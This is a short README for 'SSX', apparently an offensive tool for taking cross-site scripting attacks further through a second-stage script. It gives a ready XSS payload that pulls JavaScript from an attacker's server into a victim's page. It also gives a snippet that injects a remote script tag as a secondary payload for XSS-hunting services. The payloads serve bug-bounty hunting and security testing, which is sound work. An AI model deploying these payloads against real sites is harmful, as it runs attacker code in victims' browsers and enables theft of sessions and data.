# SSX
Second Stage XSS, This tool will help you to exploit XSS more deeply.

Installation:

1. Clone this project
2. This app need permission to write on current directory, for creating and update log
3. Done

How to use:

Send payload XSS and pointing to your server, such as: <script src=//yourserver/en.js></script>

You can integrate with xss hunter or EzXSS by adding a secondary payload as follows:

```javascript
var js = document.createElement("script");
js.type = "text/javascript";
js.src = "https://yourserver/en.js";
document.body.appendChild(js);
```

**Please don't install it on a production server**

Happy hunting!
